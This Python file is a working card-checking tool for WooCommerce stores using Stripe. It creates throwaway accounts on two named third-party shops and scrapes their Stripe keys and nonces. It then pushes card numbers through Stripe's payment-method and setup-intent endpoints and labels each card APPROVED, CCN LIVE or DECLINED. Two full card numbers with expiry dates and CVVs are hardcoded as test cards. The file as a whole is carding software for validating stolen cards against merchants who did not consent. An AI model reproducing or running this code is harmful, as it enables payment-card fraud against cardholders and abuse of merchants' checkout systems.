"""
WooCommerce Stripe Auth Checker
===============================
Professional Stripe authentication checker using WooCommerce sites.
Auto-generates credentials and processes card checks.

Supports: shop.nomade-studio.be (primary), grownetics.com (secondary)
Note: This is a legacy checker. Use nomade_checker or grownetics_checker for new implementations.
"""

import asyncio
import aiohttp
import random
import string
import re
import json
from typing import Dict, Optional, Tuple
from bs4 import BeautifulSoup
import time

# Default site (legacy - not used in /au or /mau)
WC_SITE = "https://grownetics.com"

# Request timeout
REQUEST_TIMEOUT = 60


def generate_random_email() -> str:
    """Generate a random email address."""
    chars = string.ascii_lowercase + string.digits
    username = ''.join(random.choices(chars, k=10))
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    return f"{username}@{random.choice(domains)}"


def generate_random_password() -> str:
    """Generate a random strong password."""
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choices(chars, k=12))


class WCStripeChecker:
    """
    WooCommerce Stripe Checker with auto-registration.
    """
    
    def __init__(self, site_url: str = WC_SITE):
        self.site_url = site_url.rstrip('/')
        self.stripe_pk = None
        self.nonce = None
        self.session: Optional[aiohttp.ClientSession] = None
        self.email = None
        self.password = None
    
    def _get_headers(self, referer: str = "") -> Dict[str, str]:
        """Get standard request headers."""
        return {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "referer": referer or self.site_url,
        }
    
    async def check_card(self, card: str, month: str, year: str, cvv: str) -> Dict:
        """
        Complete card check process with auto-registration.
        
        Args:
            card: Card number
            month: Expiry month (1-12 or 01-12)
            year: Expiry year (2 or 4 digits)
            cvv: CVV code
            
        Returns:
            Dict with: success, response, message, card, payment_method_id, etc.
        """
        fullcc = f"{card}|{month}|{year}|{cvv}"
        
        result = {
            "success": False,
            "response": "UNKNOWN",
            "message": "Unknown error",
            "card": fullcc,
            "payment_method_id": None,
            "login_email": None,
            "login_password": None,
            "site": self.site_url,
        }
        
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        connector = aiohttp.TCPConnector(ssl=False)
        
        try:
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                headers = self._get_headers()
                
                # Step 1: Get my-account page for registration
                async with session.get(f'{self.site_url}/my-account/', headers=headers) as resp:
                    html = await resp.text()
                
                soup = BeautifulSoup(html, 'html.parser')
                reg_form = soup.find('form', {'class': 'woocommerce-form-register'})
                if not reg_form:
                    reg_form = soup.find('form', {'class': 'register'})
                
                if not reg_form:
                    result["response"] = "SITE_ERROR"
                    result["message"] = "Registration form not found"
                    return result
                
                # Get hidden fields
                form_data = {}
                for inp in reg_form.find_all('input'):
                    name = inp.get('name')
                    value = inp.get('value', '')
                    if name:
                        form_data[name] = value
                
                # Generate credentials
                self.email = generate_random_email()
                self.password = generate_random_password()
                result["login_email"] = self.email
                result["login_password"] = self.password
                
                form_data.update({
                    'email': self.email,
                    'password': self.password,
                    'register': 'Register',
                })
                
                # Submit registration
                reg_headers = {
                    **self._get_headers(f'{self.site_url}/my-account/'),
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": self.site_url,
                }
                
                async with session.post(f'{self.site_url}/my-account/', headers=reg_headers, data=form_data, allow_redirects=True) as resp:
                    await resp.text()
                
                # Step 2: Get Stripe key and nonce
                async with session.get(f'{self.site_url}/my-account/add-payment-method/', headers=headers) as resp:
                    html3 = await resp.text()
                
                pk_match = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html3)
                if not pk_match:
                    result["response"] = "SITE_ERROR"
                    result["message"] = "Could not extract Stripe public key"
                    return result
                self.stripe_pk = pk_match.group(0)

                # Multiple nonce patterns for WooCommerce Stripe sites
                nonce_match = (
                    re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html3)
                    or re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"', html3)
                    or re.search(r'add_card_nonce["\']?\s*:\s*["\']([^"\']+)["\']', html3)
                    or re.search(r'wc_stripe_create_and_confirm_setup_intent[^"]*"[^"]*"[^"]*"([a-f0-9]+)"', html3)
                )
                if not nonce_match:
                    result["response"] = "SITE_ERROR"
                    result["message"] = "Could not extract setup nonce"
                    return result
                self.nonce = nonce_match.group(1).strip()
                
                # Step 3: Create payment method
                # Ensure year is 2 digits
                exp_year = year[-2:] if len(year) == 4 else year
                
                stripe_headers = {
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com",
                    "referer": "https://js.stripe.com/",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
                }
                
                pm_data = {
                    "type": "card",
                    "card[number]": card,
                    "card[cvc]": cvv,
                    "card[exp_year]": exp_year,
                    "card[exp_month]": month,
                    "billing_details[address][postal_code]": "10001",
                    "billing_details[address][country]": "US",
                    "payment_user_agent": "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent",
                    "key": self.stripe_pk,
                    "_stripe_version": "2024-06-20",
                }
                
                async with session.post("https://api.stripe.com/v1/payment_methods", headers=stripe_headers, data=pm_data) as resp:
                    pm_result = await resp.json()
                
                if "error" in pm_result:
                    error = pm_result["error"]
                    error_code = error.get("code", "unknown")
                    error_msg = error.get("message", "Unknown error")
                    
                    result["message"] = error_msg
                    
                    # Classify based on Stripe error codes
                    ccn_live_codes = ["incorrect_cvc", "invalid_cvc", "incorrect_zip", "postal_code_invalid"]
                    if error_code in ccn_live_codes or any(x in error_msg.lower() for x in ["cvc", "security code", "zip", "postal"]):
                        result["success"] = True
                        result["response"] = "CCN LIVE"
                    else:
                        result["response"] = "DECLINED"
                    
                    return result
                
                pm_id = pm_result.get("id")
                if not pm_id:
                    result["response"] = "PM_ERROR"
                    result["message"] = "No payment method ID returned"
                    return result
                
                result["payment_method_id"] = pm_id
                
                # Step 4: Confirm setup intent
                confirm_headers = {
                    "accept": "*/*",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": self.site_url,
                    "referer": f"{self.site_url}/my-account/add-payment-method/",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
                    "x-requested-with": "XMLHttpRequest",
                }
                
                confirm_data = {
                    "action": "create_and_confirm_setup_intent",
                    "wc-stripe-payment-method": pm_id,
                    "wc-stripe-payment-type": "card",
                    "_ajax_nonce": self.nonce,
                }
                
                async with session.post(
                    f"{self.site_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
                    headers=confirm_headers,
                    data=confirm_data
                ) as resp:
                    confirm_text = await resp.text()
                
                result["raw_response"] = confirm_text
                
                # Parse the confirmation result
                try:
                    confirm_json = json.loads(confirm_text)
                    
                    if confirm_json.get("success") == True:
                        result["success"] = True
                        result["response"] = "APPROVED"
                        result["message"] = "Card authenticated successfully"
                    else:
                        # Parse error from data
                        data = confirm_json.get("data", {})
                        error = data.get("error", {})
                        error_msg = error.get("message", confirm_text)
                        
                        result["message"] = error_msg
                        
                        # Classify the response
                        error_upper = error_msg.upper()
                        
                        # CCN Live patterns (card is valid but has verification issues)
                        ccn_patterns = [
                            "SECURITY CODE", "CVC", "CVV", "INCORRECT_CVC",
                            "POSTAL CODE", "ZIP", "ADDRESS", "AVS",
                            "AUTHENTICATION", "3D SECURE", "3DS",
                            "INSUFFICIENT FUNDS", "NSF", "LIMIT",
                            "INCORRECT NUMBER", "INVALID NUMBER"
                        ]
                        
                        if any(x in error_upper for x in ccn_patterns):
                            result["success"] = True
                            result["response"] = "CCN LIVE"
                        # Clear declined patterns
                        elif any(x in error_upper for x in [
                            "DECLINED", "DECLINE", "REJECTED", "EXPIRED",
                            "LOST", "STOLEN", "FRAUD", "DO NOT HONOR",
                            "PICKUP", "RESTRICTED", "NOT PERMITTED"
                        ]):
                            result["response"] = "DECLINED"
                        else:
                            result["response"] = "DECLINED"
                            
                except json.JSONDecodeError:
                    # Not JSON, parse as text
                    if "success" in confirm_text.lower():
                        result["success"] = True
                        result["response"] = "APPROVED"
                        result["message"] = "Setup successful"
                    elif "error" in confirm_text.lower():
                        result["response"] = "DECLINED"
                        result["message"] = confirm_text[:100]
                    else:
                        result["message"] = confirm_text[:100]
                
                return result
                
        except aiohttp.ClientError as e:
            result["response"] = "NETWORK_ERROR"
            result["message"] = f"Network error: {str(e)[:50]}"
            return result
        except asyncio.TimeoutError:
            result["response"] = "TIMEOUT"
            result["message"] = "Request timed out"
            return result
        except Exception as e:
            result["response"] = "EXCEPTION"
            result["message"] = str(e)[:100]
            return result


async def check_stripe_wc(card: str, month: str, year: str, cvv: str, site_url: Optional[str] = None) -> Dict:
    """
    Async function to check a card using WooCommerce Stripe.

    Args:
        card: Card number
        month: Expiry month (1-12)
        year: Expiry year (2 or 4 digits)
        cvv: CVV code
        site_url: Optional base URL (default: WC_SITE). Legacy checker.

    Returns:
        Result dictionary
    """
    base = (site_url or WC_SITE).rstrip("/")
    checker = WCStripeChecker(base)
    return await checker.check_card(card, month, year, cvv)


async def check_stripe_wc_fullcc(fullcc: str, site_url: Optional[str] = None) -> Dict:
    """
    Check a card in fullcc format (cc|mm|yy|cvv).

    Args:
        fullcc: Card in format cc|mm|yy|cvv or cc|mm|yyyy|cvv
        site_url: Optional gate URL. Default: WC_SITE. Legacy checker.

    Returns:
        Result dictionary with success, response, message, card, site, etc.
    """
    parts = fullcc.replace(" ", "").split("|")
    if len(parts) != 4:
        return {
            "success": False,
            "response": "INVALID_FORMAT",
            "message": "Card must be in format: cc|mm|yy|cvv",
            "card": fullcc,
            "site": site_url or WC_SITE,
        }
    card, month, year, cvv = parts
    if len(month) == 1:
        month = "0" + month
    if len(year) == 2:
        year = "20" + year
    return await check_stripe_wc(card, month, year, cvv, site_url)


def determine_status(result: Dict) -> str:
    """
    Determine the display status from result.
    
    Args:
        result: Result dict from check_stripe_wc_fullcc
        
    Returns:
        Status string: "APPROVED", "CCN LIVE", "DECLINED", or "ERROR"
    """
    response = result.get("response", "UNKNOWN").upper()
    
    if response == "APPROVED":
        return "APPROVED"
    elif response == "CCN LIVE" or response == "CCN_LIVE":
        return "CCN LIVE"
    elif response in ["DECLINED", "DECLINE"]:
        return "DECLINED"
    else:
        return "ERROR"


# Test function
async def test_checker():
    """Test the checker with sample cards."""
    print("=" * 60)
    print("WooCommerce Stripe Checker Test")
    print("=" * 60)
    
    # Test cards
    test_cards = [
        ("4067160000633135|12|2026|290", "Test card 1"),
        ("5312590016282230|12|2029|702", "Test card 2"),
    ]
    
    for card, desc in test_cards:
        print(f"\nTesting: {card}")
        print(f"Description: {desc}")
        
        result = await check_stripe_wc_fullcc(card)
        status = determine_status(result)
        
        print(f"Status: {status}")
        print(f"Response: {result.get('response')}")
        print(f"Message: {result.get('message')}")
        print("-" * 60)


if __name__ == "__main__":
    asyncio.run(test_checker())
